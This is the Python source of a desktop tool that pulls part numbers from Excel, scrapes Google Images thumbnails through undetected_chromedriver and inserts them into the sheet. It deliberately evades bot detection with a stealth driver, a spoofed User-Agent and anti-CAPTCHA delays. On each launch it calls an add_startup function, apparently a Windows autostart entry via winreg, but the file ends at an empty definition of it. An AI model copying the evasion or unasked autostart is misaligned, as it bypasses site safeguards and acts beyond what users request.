import sys
import os
import winreg
import time
import base64
import ctypes
import re
import subprocess
from ctypes import wintypes
from urllib.parse import quote_plus
from random import uniform
from io import BytesIO
from PIL import Image as PILImage
import openpyxl
from openpyxl.drawing.image import Image
from openpyxl.utils.cell import range_boundaries, get_column_letter
from bs4 import BeautifulSoup
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                             QHBoxLayout, QGridLayout, QGroupBox, QLabel,
                             QLineEdit, QPushButton, QTextEdit, QFileDialog,
                             QMessageBox, QProgressBar, QCheckBox)
from PyQt6.QtCore import pyqtSignal, QThread, Qt, QSettings
from PyQt6.QtGui import QFont, QTextCursor, QGuiApplication
import undetected_chromedriver as uc
from selenium.common.exceptions import TimeoutException, WebDriverException

VERSION = "2.3"
APP_DIR = (
    os.path.dirname(os.path.abspath(sys.executable))
    if getattr(sys, "frozen", False)
    else os.path.dirname(os.path.abspath(__file__))
)
IMG_DIR = os.path.join(APP_DIR, 'images')


class UserFacingError(Exception):
    """A short, application-authored message that is safe to display."""


def error_summary(error):
    return str(error) if isinstance(error, UserFacingError) else type(error).__name__


def get_chrome_configuration():
    browser_path = uc.find_chrome_executable()
    if not browser_path or not os.path.isfile(browser_path):
        raise UserFacingError("未找到 Chrome，请先安装 Chrome 浏览器。")

    try:
        version_api = ctypes.WinDLL("version", use_last_error=True)
        get_size = version_api.GetFileVersionInfoSizeW
        get_size.argtypes = [wintypes.LPCWSTR, ctypes.POINTER(wintypes.DWORD)]
        get_size.restype = wintypes.DWORD
        get_info = version_api.GetFileVersionInfoW
        get_info.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
        get_info.restype = wintypes.BOOL
        query_value = version_api.VerQueryValueW
        query_value.argtypes = [ctypes.c_void_p, wintypes.LPCWSTR,
                               ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(wintypes.UINT)]
        query_value.restype = wintypes.BOOL

        size = get_size(browser_path, None)
        if not size:
            raise ctypes.WinError(ctypes.get_last_error())
        buffer = ctypes.create_string_buffer(size)
        if not get_info(browser_path, 0, size, buffer):
            raise ctypes.WinError(ctypes.get_last_error())
        info = ctypes.c_void_p()
        length = wintypes.UINT()
        if not query_value(buffer, "\\", ctypes.byref(info), ctypes.byref(length)):
            raise ValueError("Missing file version")
        # VS_FIXEDFILEINFO has 13 DWORDs; dwFileVersionMS stores major/minor.
        if not info.value or length.value < 13 * ctypes.sizeof(wintypes.DWORD):
            raise ValueError("Invalid file version")
        fields = ctypes.cast(info, ctypes.POINTER(wintypes.DWORD))
        if fields[0] != 0xFEEF04BD:
            raise ValueError("Invalid version signature")
        major_version = fields[2] >> 16
        if not major_version:
            raise ValueError("Invalid Chrome version")
    except (OSError, ValueError) as e:
        raise UserFacingError("无法读取 Chrome 版本，请检查 Chrome 安装是否完整。") from e

    return browser_path, major_version


def get_cached_chromedriver(major_version):
    driver_path = os.path.join(uc.Patcher.data_path, "undetected_chromedriver.exe")
    if not os.path.isfile(driver_path):
        return None
    try:
        result = subprocess.run(
            [driver_path, "--version"],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=5,
            check=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        match = re.match(r"ChromeDriver\s+(\d+)\.", result.stdout.strip())
        if match and int(match.group(1)) == major_version:
            return driver_path
    except (OSError, subprocess.SubprocessError):
        pass
    return None


def validate_excel_range(start_cell, end_cell):
    try:
        bounds = range_boundaries(f"{start_cell.strip().upper()}:{end_cell.strip().upper()}")
        start_col, start_row, end_col, end_row = bounds
        if any(value is None for value in bounds):
            raise ValueError
        if not (1 <= start_col <= 16384 and 1 <= end_col <= 16384
                and 1 <= start_row <= 1048576 and 1 <= end_row <= 1048576):
            raise ValueError
    except (TypeError, ValueError):
        raise UserFacingError("单元格地址无效，请输入有效地址，例如 A1。") from None
    if start_col > end_col or start_row > end_row:
        raise UserFacingError("范围无效。")
    return bounds


def extract_excel_data(start_cell, end_cell, excel_file):
    start_col, start_row, end_col, end_row = validate_excel_range(start_cell, end_cell)
    wb = openpyxl.load_workbook(excel_file)
    ws = wb.active

    data = []
    for row in range(start_row, end_row + 1):
        row_data = []
        for col in range(start_col, end_col + 1):
            cell = ws.cell(row=row, column=col)
            value = str(cell.value).split('\n')[0] if cell.value is not None else ''
            row_data.append(value)

        if len(row_data) == 1:
            data.append(row_data[0])
        else:
            data.append(row_data)

    return data


def insert_images_to_excel(start_cell, image_count, excel_file):
    col_index, row, _, _ = validate_excel_range(start_cell, start_cell)
    if image_count <= 0 or row + image_count - 1 > 1048576:
        raise UserFacingError("插入范围无效，请检查起始单元格和图片数量。")
    if not os.path.exists(IMG_DIR):
        raise UserFacingError("未找到图片文件夹，请先搜索图片。")

    wb = openpyxl.load_workbook(excel_file)
    ws = wb.active

    # 解析起始单元格
    col = get_column_letter(col_index)

    error_count = 0
    img_names = [f'{i:04d}.png' for i in range(image_count)]

    for index, name in enumerate(img_names):
        img_path = os.path.join(IMG_DIR, name)

        if not os.path.exists(img_path) or os.path.getsize(img_path) == 0:
            error_count += 1
            row += 1
            continue

        try:
            # 获取单元格尺寸
            cell_ref = f"{col}{row}"
            w1 = ws.column_dimensions[col].width
            h1 = ws.row_dimensions[row].height
            w2 = ws.sheet_format.defaultColWidth
            h2 = ws.sheet_format.defaultRowHeight

            # 如果w1为13，w2为None，使用w1; 如果w1为13，w2不为None，使用w2; 如果w1不为13，使用w1
            # 如果h1为None，使用h2; 如果h1不为None，使用h1
            if w1 == 13:
                width = w2 if w2 is not None else w1
            else:
                width = w1
            height = h2 if h1 is None else h1

            width *= 8 # 一个单元格为宽为9，像素为72（待确认？）
            height *= 1.3 # 一个单元格高为13.5，像素为18（待确认？）

            # 加载并调整图片
            img = Image(img_path)
            original_width, original_height = img.width, img.height

            # 计算缩放比例
            scale_width = width / original_width
            scale_height = height / original_height
            scale = min(scale_width, scale_height)

            # 调整大小
            img.width = int(original_width * scale)
            img.height = int(original_height * scale)

            # 插入图片
            ws.add_image(img, cell_ref)

        except Exception as e:
            error_count += 1

        row += 1

    # 保存文件
    try:
        wb.save(excel_file)
    except PermissionError as e:
        raise UserFacingError("保存失败！请确保文件未被占用且不是只读文件。") from e

    return error_count


class ImageSearchWorker(QThread):
    search_started = pyqtSignal(int)  # 总任务数
    item_completed = pyqtSignal(int, bool, str)  # 索引，是否成功，消息
    search_finished = pyqtSignal(list)  # 失败件号列表
    search_error = pyqtSignal(str)  # 全局错误信息
    captcha_required = pyqtSignal(str)  # 需要用户完成人机验证

    def __init__(self):
        super().__init__()
        self.search_terms = []
        self.enable_filter = True
        self.random_delay = False
        self.priority_sites = ['ebay', 'amazon', 'cat', 'alibaba']
        self.blacklist_sites = ['farfetch']
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0'}
        self.driver = None
        self.captcha_detected = False
        self.stop_requested = False
        self.error_message = None
        self.was_stopped = False

    def setup(self, search_terms, enable_filter=True, random_delay=False):
        self.search_terms = [x.strip() for x in search_terms]
        self.enable_filter = True
        self.random_delay = random_delay
        self.captcha_detected = False
        self.stop_requested = False
        self.error_message = None
        self.was_stopped = False

    def request_stop(self):
        self.stop_requested = True
    def search_website(self, tag):
        """返回图片 alt 文本，用于不区分大小写的网站关键词匹配。"""
        return tag.get("alt", "").strip().lower()

    def _load_page_source(self, url):
        """加载搜索页，检测到前 20 张已完成的搜索结果图片后停止。"""
        if self.stop_requested:
            raise InterruptedError("已停止")
        if self.driver is None:
            raise UserFacingError("浏览器驱动未初始化")

        # 标记旧文档，避免导航尚未完成时误读上一条搜索的 DOM。
        self.driver.execute_script(
            "document.documentElement.setAttribute('data-image-search-old', '1'); "
            "window.location.href = arguments[0];",
            url
        )
        deadline = time.monotonic() + 60
        stable_since = None
        last_image_count = 0

        while time.monotonic() < deadline and not self.stop_requested:
            image_count, ready_state, is_new_document = self.driver.execute_script("""
                const isNewDocument = !document.documentElement ||
                    document.documentElement.getAttribute('data-image-search-old') !== '1';
                const loadedResults = Array.from(
                    document.querySelectorAll("img[id^='dimg_']")
                ).filter(img => (img.currentSrc || img.src) && img.complete && img.naturalWidth >= 100 && img.naturalHeight >= 100);
                return [loadedResults.length, document.readyState, isNewDocument];
            """)
            if not is_new_document:
                time.sleep(0.1)
                continue
            if image_count >= 20:
                self.driver.execute_script("window.stop();")
                return self.driver.page_source
            if image_count > last_image_count:
                last_image_count = image_count
                stable_since = time.monotonic()
            elif stable_since is None and ready_state == "complete":
                stable_since = time.monotonic()
            elif stable_since is not None and time.monotonic() - stable_since >= 5:
                return self.driver.page_source
            time.sleep(0.1)

        if self.stop_requested:
            raise InterruptedError("已停止")
        raise UserFacingError("网页加载超时，请检查网络连接后重试")
    @staticmethod
    def _is_large_image(img):
        """过滤搜索结果顶部的小图和站点图标。"""
        try:
            width = int(img.get("width", 0) or 0)
            height = int(img.get("height", 0) or 0)
        except (TypeError, ValueError):
            return True
        return not ((0 < width < 100) or (0 < height < 100))

    @staticmethod
    def _is_captcha_page(page_source):
        normalized = page_source.lower()
        return (
            "我们的系统检测到您的计算机网络中存在异常流量" in page_source
            or "our systems have detected unusual traffic" in normalized
        )
    def _wait_for_captcha(self):
        """Wait indefinitely until the Google abnormal-traffic markers disappear."""
        while not self.stop_requested:
            if not self._is_captcha_page(self.driver.page_source):
                time.sleep(1)
                return not self.stop_requested
            time.sleep(1)
        return False

    def download_image(self, url, index, term):
        file_name = os.path.join(IMG_DIR, f'{index:04d}.png')
        img_tags = []
        try:
            page_source = self._load_page_source(url)
            
            # debug
            '''with open(f"d:/Excel-Tools/debug/{index}.html", "w", encoding="utf-8") as f:
                f.write(page_source)'''

            # 解析图片
            soup = BeautifulSoup(page_source, "html.parser")

            captcha_page = self._is_captcha_page(page_source)
            
            while captcha_page:
                self.captcha_detected = True
                self.captcha_required.emit("Google要求人机验证，请在浏览器窗口中完成验证。")
                if not self._wait_for_captcha():
                    return False, term, "已停止"
                self.captcha_detected = False
                page_source = self._load_page_source(url)
                soup = BeautifulSoup(page_source, "html.parser")
                captcha_page = self._is_captcha_page(page_source)
            
            # 只保留 Google 搜索结果缩略图，包含没有 alt 的 Base64 缩略图。
            img_tags = [
                img for img in soup.find_all("img")
                if img.get("id", "").startswith("dimg_")
                and self._is_large_image(img)
            ]

        except InterruptedError:
            return False, term, "已停止"
        except UserFacingError as e:
            return False, term, error_summary(e)
        except (TimeoutError, TimeoutException) as e:
            return False, term, f"网页加载超时: {type(e).__name__}"
        except WebDriverException:
            raise
        except Exception as e:
            return False, term, f"解析搜索结果失败: {type(e).__name__}"
        finally:
            self.captcha_detected = False

        # 先排除黑名单，再按 alt 中的网站关键词排序。
        available = [
            img for img in img_tags
            if not any(black.lower() in self.search_website(img) for black in self.blacklist_sites)
        ]
        if self.enable_filter:
            priority = [
                img for img in available
                if any(pri.lower() in self.search_website(img) for pri in self.priority_sites)
            ]
            record = priority + [img for img in available if img not in priority]
        else:
            record = available

        # 只保存筛选结果中的第一张 Base64 图片。
        invalid_images = 0
        for img in record:
            if self.stop_requested:
                return False, term, "已停止"
            src = img.attrs.get("src", "")
            if src.startswith("data:image/") and ";base64," in src:
                try:
                    image_data = src.split(",", 1)[1]
                    image_bytes = base64.b64decode(image_data, validate=True)
                    with PILImage.open(BytesIO(image_bytes)) as image:
                        if image.width < 100 or image.height < 100:
                            continue
                        image.load()
                except (ValueError, OSError, PILImage.DecompressionBombError):
                    invalid_images += 1
                    continue
                # 写入错误属于存储故障，不能当成坏图跳过。
                try:
                    with open(file_name, 'wb') as f:
                        f.write(image_bytes)
                except OSError as e:
                    try:
                        os.remove(file_name)
                    except OSError:
                        pass
                    raise UserFacingError("保存图片失败，请检查图片目录的写入权限和磁盘空间。") from e
                return True, term, "成功"

        if invalid_images:
            return False, term, f"图片数据损坏或格式不支持（{invalid_images} 张）"
        return False, term, "未找到图片"

    def _wait_between_searches(self):
        """Wait 2-5 seconds between consecutive Google searches."""
        if self.stop_requested:
            return False
        if not self.random_delay:
            return True
        deadline = time.time() + uniform(2.0, 5.0)
        while time.time() < deadline:
            if self.stop_requested:
                return False
            time.sleep(0.1)
        return True
    def run(self):
        # 通知开始搜索
        total_tasks = len(self.search_terms)
        self.search_started.emit(total_tasks)

        failed_items = []
        completed_tasks = 0
        stage = "准备图片目录失败"

        try:
            os.makedirs(IMG_DIR, exist_ok=True)
            # 清空本批次的旧图，避免失败或停止后插入上次搜索的图片。
            for index in range(total_tasks):
                with open(os.path.join(IMG_DIR, f'{index:04d}.png'), 'wb'):
                    pass
            if self.stop_requested:
                return
            stage = "无法启动浏览器驱动"
            options = uc.ChromeOptions()
            options.page_load_strategy = "none"
            options.add_argument("--start-minimized")
            browser_path, major_version = get_chrome_configuration()
            self.driver = uc.Chrome(
                options=options,
                browser_executable_path=browser_path,
                driver_executable_path=get_cached_chromedriver(major_version),
                version_main=major_version
            )
            self.driver.set_script_timeout(15)
            self.driver.set_page_load_timeout(60)
            self.driver.minimize_window()
            stage = "搜索中断"

            # 单线程顺序搜索，整个批次复用同一个浏览器实例。
            for index, term in enumerate(self.search_terms):
                if self.stop_requested or (index > 0 and not self._wait_between_searches()):
                    break
                if not term:
                    message = "件号为空，已跳过"
                    failed_items.append((index, term, message))
                    self.item_completed.emit(index, False, message)
                    completed_tasks = index + 1
                    continue
                url = f'https://www.google.com.hk/search?q={quote_plus(term)}&udm=2'
                try:
                    success, item_term, message = self.download_image(url, index, term)
                    if not success:
                        failed_items.append((index, term, message))
                    self.item_completed.emit(index, success, message)
                except (WebDriverException, OSError, UserFacingError):
                    raise
                except Exception as e:
                    message = f"任务异常: {type(e).__name__}"
                    failed_items.append((index, term, message))
                    self.item_completed.emit(index, False, message)
                completed_tasks = index + 1
                if self.stop_requested:
                    break
        except Exception as e:
            self.error_message = f"{stage}: {error_summary(e)}"
            self.search_error.emit(self.error_message)
        finally:
            self.was_stopped = self.stop_requested
            reason = self.error_message or "已停止"
            for pending_index in range(completed_tasks, total_tasks):
                failed_items.append((pending_index, self.search_terms[pending_index], reason))
                self.item_completed.emit(pending_index, False, reason)
            if self.driver is not None:
                try:
                    self.driver.quit()
                except Exception:
                    pass
                self.driver = None
            self.captcha_detected = False
            self.stop_requested = False
            self.search_finished.emit(failed_items)


# 支持拖拽的文本输入框
class DragDropLineEdit(QLineEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setAcceptDrops(True)

    def dragEnterEvent(self, event):
        if event.mimeData().hasUrls():
            event.accept()
        else:
            event.ignore()

    def dropEvent(self, event):
        files = [u.toLocalFile() for u in event.mimeData().urls()]
        if files:
            # 只取第一个文件
            file_path = files[0]
            if file_path.lower().endswith('.xlsx'):
                self.setText(file_path)
            else:
                QMessageBox.warning(self, "警告", "请拖拽.xlsx格式的Excel文件")


# 主界面
class ExcelToolsGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.search_worker = ImageSearchWorker()
        self.completed_count = 0
        self.total_tasks = 0
        self.auto_processing = False
        self.init_ui()
        self.settings = QSettings("Sam", "ExcelTools")
        self.load_settings()
        self.setup_connections()

    def center_window(self):
        screen = QGuiApplication.primaryScreen().geometry()
        size = self.geometry()
        self.move(
            (screen.width() - size.width()) // 2,
            (screen.height() - size.height()) // 2
        )

    def init_ui(self):
        self.setWindowTitle(f"件号搜图工具 by Sam v{VERSION}")
        self.resize(450, 580)
        self.center_window()

        # 设置字体
        font = QFont("Microsoft YaHei", 10)
        self.setFont(font)

        # 中央部件
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        # 主布局
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(5)
        main_layout.setContentsMargins(10, 10, 10, 10)

        # 文件选择区域
        file_group = self.create_file_group()
        main_layout.addWidget(file_group)

        # 参数设置区域
        param_group = self.create_param_group()
        main_layout.addWidget(param_group)

        # 内容和日志区域
        content_log_group = self.create_content_log_group()
        main_layout.addWidget(content_log_group, 1)  # 设置伸缩因子为1

        # 操作按钮区域
        button_group = self.create_button_group()
        main_layout.addWidget(button_group)

        progress_group = self.create_progress_group()
        main_layout.addWidget(progress_group)

        self.setStatusBar(None)

    # 文件选择区域
    def create_file_group(self):
        group = QGroupBox("文件设置")
        layout = QHBoxLayout()
        layout.setSpacing(5)

        layout.addWidget(QLabel("选择文件:"))

        # 使用支持拖拽的自定义控件
        self.file_path_edit = DragDropLineEdit()
        self.file_path_edit.setReadOnly(True)
        layout.addWidget(self.file_path_edit, 1)

        self.select_file_btn = QPushButton("选择")
        self.select_file_btn.setFixedWidth(50)
        layout.addWidget(self.select_file_btn)

        self.open_file_btn = QPushButton("打开")
        self.open_file_btn.setFixedWidth(50)
        layout.addWidget(self.open_file_btn)

        group.setLayout(layout)
        return group

    # 参数设置区域
    def create_param_group(self):
        group = QGroupBox("参数设置")
        layout = QGridLayout()
        layout.setSpacing(10)

        layout.addWidget(QLabel("提取起始单元格:"), 0, 0)
        self.start_cell_edit = QLineEdit()
        self.start_cell_edit.setFixedWidth(80)
        layout.addWidget(self.start_cell_edit, 0, 1)

        layout.addWidget(QLabel("插入起始单元格:"), 0, 2)
        self.insert_cell_edit = QLineEdit()
        self.insert_cell_edit.setFixedWidth(80)
        layout.addWidget(self.insert_cell_edit, 0, 3)

        layout.addWidget(QLabel("提取结束单元格:"), 1, 0)
        self.end_cell_edit = QLineEdit()
        self.end_cell_edit.setFixedWidth(80)
        layout.addWidget(self.end_cell_edit, 1, 1)

        self.filter_check = QCheckBox("启用随机延迟（防止人机验证）")
        self.filter_check.setChecked(False)
        layout.addWidget(self.filter_check, 1, 2, 1, 2)

        group.setLayout(layout)
        return group

    # 内容与日志区域
    def create_content_log_group(self):
        group = QGroupBox("内容与日志")
        layout = QHBoxLayout()
        layout.setSpacing(5)

        content_widget = QWidget()
        content_layout = QVBoxLayout(content_widget)
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.addWidget(QLabel("待搜索内容:"))

        self.search_text = QTextEdit()
        self.search_text.setPlaceholderText("此处显示提取的待搜索内容")
        content_layout.addWidget(self.search_text)

        log_widget = QWidget()
        log_layout = QVBoxLayout(log_widget)
        log_layout.setContentsMargins(0, 0, 0, 0)
        log_layout.addWidget(QLabel("搜索日志:"))

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setStyleSheet("""
            QTextEdit {
                background-color: #f5f5f5;
                border: 1px solid #ccc;
                font-family: Consolas, 'Courier New', monospace;
                font-size: 9pt;
            }
        """)
        log_layout.addWidget(self.log_text)

        # 设置两个区域的宽度比例
        layout.addWidget(content_widget, 1)
        layout.addWidget(log_widget, 1)

        group.setLayout(layout)
        return group

    # 操作按钮区域
    def create_button_group(self):
        group = QGroupBox("操作")
        layout = QHBoxLayout()
        layout.setSpacing(5)

        # 四个主要按钮
        bt_w = 100
        bt_h = 30
        self.extract_btn = QPushButton("提取件号")
        self.extract_btn.setFixedWidth(bt_w)
        self.extract_btn.setFixedHeight(bt_h)
        layout.addWidget(self.extract_btn)

        self.search_btn = QPushButton("搜索图片")
        self.search_btn.setFixedWidth(bt_w)
        self.search_btn.setFixedHeight(bt_h)
        layout.addWidget(self.search_btn)

        self.insert_btn = QPushButton("插入图片")
        self.insert_btn.setFixedWidth(bt_w)
        self.insert_btn.setFixedHeight(bt_h)
        layout.addWidget(self.insert_btn)

        self.auto_btn = QPushButton("一键操作")
        self.auto_btn.setFixedWidth(bt_w)
        self.auto_btn.setFixedHeight(bt_h)
        self.auto_btn.setStyleSheet("background-color: #4CAF50; color: white; font-weight: bold;")
        layout.addWidget(self.auto_btn)

        # 添加弹性空间使按钮居中
        layout.addStretch()

        group.setLayout(layout)
        return group

    # 搜索进度条区域
    def create_progress_group(self):
        group = QGroupBox("搜索进度")
        layout = QVBoxLayout()

        # 进度条
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setFormat("就绪")
        layout.addWidget(self.progress_bar)

        group.setLayout(layout)
        return group

    # 创建连接
    def load_settings(self):
        self.file_path_edit.setText(self.settings.value("file_path", "", type=str))
        self.start_cell_edit.setText(self.settings.value("start_cell", "", type=str))
        self.end_cell_edit.setText(self.settings.value("end_cell", "", type=str))
        self.insert_cell_edit.setText(self.settings.value("insert_cell", "", type=str))
        self.filter_check.setChecked(self.settings.value("random_delay", False, type=bool))

    def save_settings(self):
        self.settings.setValue("file_path", self.file_path_edit.text())
        self.settings.setValue("start_cell", self.start_cell_edit.text())
        self.settings.setValue("end_cell", self.end_cell_edit.text())
        self.settings.setValue("insert_cell", self.insert_cell_edit.text())
        self.settings.setValue("random_delay", self.filter_check.isChecked())
        self.settings.sync()
    def setup_connections(self):
        # 文件操作
        self.select_file_btn.clicked.connect(self.select_excel_file)
        self.open_file_btn.clicked.connect(self.open_excel_file)
        self.file_path_edit.textChanged.connect(self.on_excel_file_changed)

        # 操作按钮
        self.extract_btn.clicked.connect(self.extract_content)
        self.search_btn.clicked.connect(self.start_search)
        self.insert_btn.clicked.connect(self.insert_images)
        self.auto_btn.clicked.connect(self.auto_process)

        # 搜索工作线程信号
        self.search_worker.search_started.connect(self.on_search_started)
        self.search_worker.item_completed.connect(self.on_item_completed)
        self.search_worker.search_finished.connect(self.on_search_finished)
        self.search_worker.search_error.connect(self.on_search_error)
        self.search_worker.captcha_required.connect(self.on_captcha_required)

    def on_excel_file_changed(self):
        """选择新的 Excel 文件后，重置依赖文件内容的单元格范围。"""
        self.start_cell_edit.clear()
        self.end_cell_edit.clear()
        self.insert_cell_edit.clear()

    def select_excel_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "选择Excel文件", "", "Excel文件 (*.xlsx)"
        )

        if file_path:
            self.file_path_edit.setText(file_path)

    def open_excel_file(self):
        file_path = self.file_path_edit.text()
        if file_path and os.path.exists(file_path):
            try:
                os.startfile(file_path)
            except Exception as e:
                QMessageBox.warning(self, "警告", f"无法打开文件: {error_summary(e)}")
        else:
            QMessageBox.warning(self, "警告", "文件不存在")

    def extract_content(self):
        excel_file = self.file_path_edit.text()
        start_cell = self.start_cell_edit.text()
        end_cell = self.end_cell_edit.text()

        # 验证输入
        if not excel_file:
            QMessageBox.warning(self, "警告", "请选择Excel文件")
            return

        if not os.path.exists(excel_file):
            QMessageBox.warning(self, "警告", "文件不存在")
            return

        if not start_cell or not end_cell:
            QMessageBox.warning(self, "警告", "请输入提取范围")
            return

        try:
            # 提取数据
            data = extract_excel_data(start_cell, end_cell, excel_file)

            # 显示数据
            lines = [
                (" | ".join(item) if any(value.strip() for value in item) else "")
                if isinstance(item, list) else item
                for item in data
            ]
            self.search_text.setPlainText("\n".join(lines))

            self.add_log(f"提取完成，共 {len(data)} 个件号")
            return True

        except Exception as e:
            QMessageBox.critical(self, "错误", f"提取失败: {error_summary(e)}")
            self.add_log(f"提取失败: {error_summary(e)}", is_error=True)

    def start_search(self):
        if self.search_worker.isRunning():
            self.search_worker.request_stop()
            self.search_btn.setEnabled(False)
            self.add_log("正在停止搜索...", is_warning=True)
            return

        # 获取搜索内容
        content = self.search_text.toPlainText()
        if not content.strip():
            QMessageBox.warning(self, "警告", "没有可搜索的内容，请先提取件号")
            return

        search_terms = content.split('\n')
        search_terms = [term.strip() for term in search_terms]

        if not search_terms:
            QMessageBox.warning(self, "警告", "没有可搜索的内容")
            return

        # 重置进度
        self.completed_count = 0
        self.total_tasks = len(search_terms)
        self.progress_bar.setMaximum(100)
        self.progress_bar.setValue(0)
        self.progress_bar.setFormat(f"0% (0/{self.total_tasks})")

        # 设置搜索参数
        self.search_worker.setup(
            search_terms=search_terms,
            enable_filter=True,
            random_delay=self.filter_check.isChecked()
        )

        # 搜索按钮切换为停止；其他按钮保持禁用。
        self.search_btn.setText("停止搜索")
        self.search_btn.setEnabled(True)
        self.extract_btn.setEnabled(False)
        self.insert_btn.setEnabled(False)
        self.auto_btn.setEnabled(False)

        self.add_log(f"开始搜索，共 {len(search_terms)} 个件号")
        self.search_worker.start()
        return True

    def on_search_started(self, total_tasks):
        self.total_tasks = total_tasks
        self.completed_count = 0

        if total_tasks > 0:
            self.progress_bar.setMaximum(100)
            self.progress_bar.setValue(0)
            self.progress_bar.setFormat(f"0% (0/{self.total_tasks})")
        else:
            self.progress_bar.setValue(0)
            self.progress_bar.setFormat("无任务")

    # 单个任务完成
    def on_item_completed(self, index, success, message):
        self.completed_count += 1

        if self.total_tasks > 0:
            progress_percent = int((self.completed_count / self.total_tasks) * 100)
            self.progress_bar.setValue(progress_percent)
            self.progress_bar.setFormat(f"{progress_percent}% ({self.completed_count}/{self.total_tasks})")

        # 成功项目只更新进度，不逐条写入日志；失败项目保留日志。
        if success:
            return

        # 添加日志
        terms = self.search_worker.search_terms
        if index < len(terms):
            term = terms[index] or f"第 {index + 1} 行（空白）"
            log_msg = f"✗ {term} - {message}"
            color = "red"

            cursor = self.log_text.textCursor()
            cursor.movePosition(QTextCursor.MoveOperation.End)

            if success:
                html = f'<font color="{color}">{log_msg}</font>'
            else:
                html = f'<font color="{color}"><b>{log_msg}</b></font>'

            cursor.insertHtml(html + "<br>")
            self.log_text.ensureCursorVisible()

    def _show_topmost_alert(self, title, message, icon=QMessageBox.Icon.Warning):
        box = QMessageBox(icon, title, message, parent=self)
        box.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, True)
        box.setWindowState(box.windowState() | Qt.WindowState.WindowActive)
        box.exec()
    # 搜索完成时触发
    def on_search_finished(self, failed_items):
        self.search_btn.setText("搜索图片")
        self.search_btn.setEnabled(True)
        self.extract_btn.setEnabled(True)
        self.insert_btn.setEnabled(True)
        self.auto_btn.setEnabled(True)

        if self.search_worker.error_message:
            self.auto_processing = False
            self.progress_bar.setValue(0)
            self.progress_bar.setFormat("错误")
            return
        if self.search_worker.was_stopped:
            self.auto_processing = False
            self.progress_bar.setFormat("已停止")
            self.add_log("搜索已停止", is_warning=True)
            return

        # 完成时进度条设为100%
        self.progress_bar.setValue(100)
        self.progress_bar.setFormat("100% (完成)")

        failure_count = len(failed_items)
        message = f"搜索完成。成功：{self.total_tasks - failure_count}，失败：{failure_count}"
        self.add_log(message, is_warning=bool(failure_count))
        if failed_items:
            if not self.auto_processing:
                self._show_topmost_alert("完成", message)
        else:
            if not self.auto_processing:
                QMessageBox.information(self, "完成", message)

        if self.auto_processing:
            self.auto_insert_after_search(failed_items)

    # 搜索出现全局错误时触发
    def on_captcha_required(self, message):
        self.add_log(f"搜索暂停: {message}", is_warning=True)
        self._show_topmost_alert("需要人机验证", message, QMessageBox.Icon.Warning)
    def on_search_error(self, error_message):
        self.progress_bar.setValue(0)
        self.progress_bar.setFormat("错误")

        self.add_log(f"搜索失败: {error_message}", is_error=True)
        self._show_topmost_alert("错误", error_message, QMessageBox.Icon.Critical)

    def add_log(self, message, is_error=False, is_warning=False):
        if is_error:
            log_msg = f"✗ {message}"
            color = "red"
        elif is_warning:
            log_msg = f"⚠ {message}"
            color = "#FFA500"  # 橙色
        else:
            log_msg = f"● {message}"
            color = "blue"

        cursor = self.log_text.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)

        if is_error or is_warning:
            html = f'<font color="{color}"><b>{log_msg}</b></font>'
        else:
            html = f'<font color="{color}">{log_msg}</font>'

        cursor.insertHtml(html + "<br>")
        self.log_text.ensureCursorVisible()

    def insert_images(self):
        excel_file = self.file_path_edit.text()
        insert_cell = self.insert_cell_edit.text()

        # 验证输入
        if not excel_file:
            QMessageBox.warning(self, "警告", "请选择Excel文件")
            return

        if not os.path.exists(excel_file):
            QMessageBox.warning(self, "警告", "文件不存在")
            return

        if not insert_cell:
            QMessageBox.warning(self, "警告", "请输入插入起始单元格")
            return

        # 检查图片目录是否存在
        if not os.path.exists(IMG_DIR):
            QMessageBox.warning(self, "警告", "未找到图片文件夹，请先搜索图片")
            return

        # 计算图片数量
        start_cell = self.start_cell_edit.text()
        end_cell = self.end_cell_edit.text()

        if not start_cell or not end_cell:
            QMessageBox.warning(self, "警告", "请输入提取范围以计算图片数量")
            return

        try:
            # 提取单元格行号
            _, start_row, _, end_row = validate_excel_range(start_cell, end_cell)
            image_count = end_row - start_row + 1

            # 插入图片
            error_count = insert_images_to_excel(insert_cell, image_count, excel_file)

            message = f"插入完成。成功：{image_count - error_count}，失败：{error_count}"
            self.add_log(message, is_warning=error_count > 0)
            if error_count > 0:
                if not self.auto_processing:
                    QMessageBox.warning(self, "完成", message)
            else:
                if not self.auto_processing:
                    QMessageBox.information(self, "完成", message)
            return error_count

        except Exception as e:
            QMessageBox.critical(self, "错误", f"插入失败: {error_summary(e)}")
            self.add_log(f"插入失败: {error_summary(e)}", is_error=True)

    # 一键操作
    def auto_process(self):
        if self.auto_processing or self.search_worker.isRunning():
            return
        if not self.extract_content():
            return
        self.auto_processing = True
        if not self.start_search():
            self.auto_processing = False

    def auto_insert_after_search(self, failed_items):
        try:
            error_count = self.insert_images()
            if error_count is None:
                return
            if failed_items or error_count:
                QMessageBox.warning(
                    self, "完成",
                    f"一键操作完成！{len(failed_items)} 个件号搜图失败，"
                    f"{error_count} 个图片未能插入。"
                )
            else:
                QMessageBox.information(self, "完成", "一键操作完成！")
        finally:
            self.auto_processing = False

    def closeEvent(self, event):
        self.save_settings()
        if self.search_worker.isRunning():
            self.search_worker.request_stop()
            self.search_worker.wait(3000)
            if self.search_worker.isRunning():
                self.search_worker.terminate()
                self.search_worker.wait()
        event.accept()


def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = ExcelToolsGUI()
    window.show()
    add_startup()

    sys.exit(app.exec())

def add_startup():
